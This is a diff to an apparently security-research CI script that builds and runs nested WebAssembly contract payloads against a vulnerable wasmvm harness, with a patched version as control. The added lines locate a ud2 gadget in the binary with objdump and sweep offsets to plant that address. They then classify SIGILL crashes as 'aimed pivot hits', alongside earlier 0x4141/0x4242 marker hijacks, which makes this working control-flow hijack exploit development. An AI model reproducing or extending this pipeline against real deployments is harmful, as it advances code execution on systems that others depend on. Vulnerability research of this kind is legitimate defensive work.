@@ -158,6 +158,26 @@ if [ -n "$PY" ]; then
     echo "  dummy=$DUMMY done (cumulative crashes: $CRASHES)" | tee -a "$OUT/sweep.log"
   done
   echo "total nested crashes: $CRASHES / 1360" | tee -a "$OUT/sweep.log"
+
+  echo "--- aimed pivot sweep (all planted slots = the harness's own ud2 gadget; warmups=3) ---"
+  UD2_OFF=$(objdump -d ./harness/harness 2>/dev/null | grep -m1 -E '^[[:space:]]*[0-9a-f]+:[[:space:]]+0f 0b' | awk '{print $1}' | tr -d ':')
+  if [ -n "$UD2_OFF" ]; then
+    echo "  harness ud2 gadget @0x$UD2_OFF" | tee -a "$OUT/sweep.log"
+    for R in $(seq 225 285); do
+      OFF=$((512 - R))
+      ITERS=$((65536 + R + 1))
+      D="$NESTED/aim_r$R"
+      python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --plants gadget --plant-addr "0x$UD2_OFF" > /dev/null 2>&1 || continue
+      for w in holder trigger benign; do
+        "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
+      done
+      timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-aim-r$R.json" > "ci-out/harness/nested-vuln-aim-r$R.stdout" 2> "ci-out/harness/nested-vuln-aim-r$R.stderr" || true
+    done
+    echo "  aimed sweep done" | tee -a "$OUT/sweep.log"
+  else
+    echo "  no ud2 gadget found; aimed sweep skipped" | tee -a "$OUT/sweep.log"
+  fi
+
   echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
   D="$NESTED/build_r256"
   if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
@@ -168,15 +188,16 @@ if [ -n "$PY" ]; then
   echo "--- nested summary (classified) ---"
   python3 - <<'PYEOF'
 import glob, os, json, re
-marker, holder, trigger, hit, clean, errd = [], [], [], [], [], []
+marker, holder, trigger, hit, clean, errd, aimed = [], [], [], [], [], [], []
 
 def classify(f, dummy):
-    m = re.search(r'nested-vuln-(?:d(\d+)-)?r(\d+)\.stderr$', f)
+    m = re.search(r'nested-vuln-(aim-)?(?:d(\d+)-)?r(\d+)\.stderr$', f)
     if not m:
         return
-    d = int(m.group(1)) if m.group(1) else 0
-    r = int(m.group(2))
-    tag = f"d{d}/r{r}" if d else f"r{r}"
+    is_aim = bool(m.group(1))
+    d = int(m.group(2)) if m.group(2) else 0
+    r = int(m.group(3))
+    tag = f"aim/r{r}" if is_aim else (f"d{d}/r{r}" if d else f"r{r}")
     j = f.replace(".stderr", ".json")
     txt = open(f, errors="replace").read()
     if os.path.exists(j) and os.path.getsize(j) > 0:
@@ -196,7 +217,9 @@ def classify(f, dummy):
         return
     mp = re.search(r'PC=0x([0-9a-f]+)', txt)
     pc = mp.group(1) if mp else "?"
-    if pc.startswith("4242") or pc.startswith("4141"):
+    if "SIGILL" in txt:
+        aimed.append((tag, pc))                    # executed a ud2 -> AIMED PIVOT HIT
+    elif pc.startswith("4242") or pc.startswith("4141"):
         marker.append((tag, pc))                   # jumped to a planted pivot/marker value
     elif "nestedQuerier" in txt:
         trigger.append(tag)                        # crash inside the nested trigger (stream off stack)
@@ -208,7 +231,10 @@ for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p:
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-d*-r*.stderr"),
                 key=lambda p: (int(p.split("-d")[-1].split("-r")[0]), int(p.split("-r")[-1].split(".")[0]))):
     classify(f, None)
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-aim-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
+    classify(f, None)
 
+print("AIMED-PIVOT HITS (SIGILL):", len(aimed), aimed[:40])
 print("MARKER-HIJACKS (PC=0x41../0x42..):", len(marker), marker[:80])
 print("holder-side crashes              :", len(holder), [f"{t}@0x{pc}" for t, pc in holder[:80]])
 print("trigger-side crashes             :", len(trigger), trigger[:40])
